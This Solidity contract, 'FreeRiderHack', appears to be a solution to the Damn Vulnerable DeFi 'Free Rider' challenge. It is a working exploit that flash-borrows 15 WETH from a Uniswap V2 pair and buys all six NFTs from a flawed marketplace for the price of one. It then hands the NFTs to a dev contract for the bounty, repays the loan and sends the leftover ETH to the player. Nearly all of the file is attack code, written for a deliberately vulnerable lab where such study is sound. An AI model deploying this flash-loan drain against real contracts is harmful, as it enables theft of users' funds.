// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../DamnValuableNFT.sol";
import "hardhat/console.sol";


interface IWETH {
    function balanceOf(address account) external view returns (uint);
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IMarketplace {
    function buyMany(uint[] calldata _ids) external payable;
}

contract FreeRiderHack is ReentrancyGuard, IERC721Receiver {
    using Address for address payable;

    uint256 public constant NFT_PRICE = 15 ether;
    uint256[] public nftIds = [0, 1, 2, 3, 4, 5];

    IWETH public weth;
    IUniswapV2Pair public uniswapV2Pair;
    IUniswapV2Factory public factoryV2;
    IMarketplace public marketplace;
    DamnValuableNFT public nft;
    address public devContract;
    address public player;


    constructor(address _player, address _weth, address _nft, address _devContract, address _marketplace, address _factoryV2, address _uniswapV2Pair) {
        player = _player;
        weth = IWETH(_weth);
        nft = DamnValuableNFT(_nft);
        devContract = _devContract;
        marketplace = IMarketplace(_marketplace);
        factoryV2 = IUniswapV2Factory(_factoryV2);
        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair);
    }

    function execute() external payable {
        if(msg.sender != player)
            revert();
        // If we're going to get weth, we'd need to convert those to ETH as well to pay for the NFTs
        bytes memory data = abi.encode(address(this));
        uniswapV2Pair.swap(15 ether, 0, address(this), data);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public payable {
        require(sender == address(this));
        require(tx.origin == player);
        // You have the required 15 WETH (NFT_PRICE) at this point | Convert weth to eth
        weth.withdraw(NFT_PRICE);
        // Call buyMany and provide the ids of the NFTs to buy
        marketplace.buyMany{ value: NFT_PRICE }(nftIds);
        // Return the NFTs to the devs contract
        bytes memory encodedData = abi.encode(address(this));
        // Put the below in a loop to drain the contract
        for (uint i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), devContract, i, encodedData);
        }
        // return the required 15 {W}ETH (NFT_PRICE) to the uniswap contract
        uint payableAmount = NFT_PRICE + .05 ether;
        weth.deposit{ value: payableAmount }();
        weth.transfer(address(uniswapV2Pair), payableAmount);
        // transfer the remaining amount to the player
        payable(player).sendValue(address(this).balance);
    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        override
        nonReentrant
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}